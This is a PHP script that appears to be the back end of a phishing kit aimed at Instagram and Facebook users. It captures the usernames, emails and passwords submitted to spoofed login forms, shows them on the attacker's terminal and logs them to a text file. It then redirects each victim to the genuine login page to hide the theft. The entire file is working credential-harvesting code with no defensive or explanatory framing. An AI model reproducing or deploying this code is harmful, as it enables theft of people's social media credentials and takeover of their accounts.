<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Detect either Instagram or Facebook input names
    $user = $_POST['username'] ?? $_POST['email'] ?? 'UNKNOWN_USER';
    $pass = $_POST['password'] ?? $_POST['pass'] ?? 'UNKNOWN_PASS';

    // Determine platform
    $platform = isset($_POST['email']) ? "Facebook" : "Instagram";

    // Choose color
    $color = $platform === "Facebook" ? "\033[34m" : "\033[35m"; // Blue or Magenta
    $reset = "\033[0m";

    // Create colored output for terminal (not saved in file)
    $terminal_output = "{$color}==== [$platform Login] ==== {$reset}\n";
    $terminal_output .= "Username: $user\nPassword: $pass\n";
    $terminal_output .= "Time: " . date("Y-m-d H:i:s") . "\n";
    $terminal_output .= "===========================\n";

    // Print to terminal
    echo $terminal_output;

    // Create plain text log for saving
    $data = "==== [$platform Login] ====\n";
    $data .= "Username: $user\nPassword: $pass\n";
    $data .= "Time: " . date("Y-m-d H:i:s") . "\n";
    $data .= "===========================\n\n";

    // Save to file
    file_put_contents("login.txt", $data, FILE_APPEND);

    // Redirect to legit site
    if ($platform === "Facebook") {
        header("Location: https://m.facebook.com/login");
    } else {
        header("Location: https://www.instagram.com/accounts/login/?hl=en");
    }

    exit();
}
?>
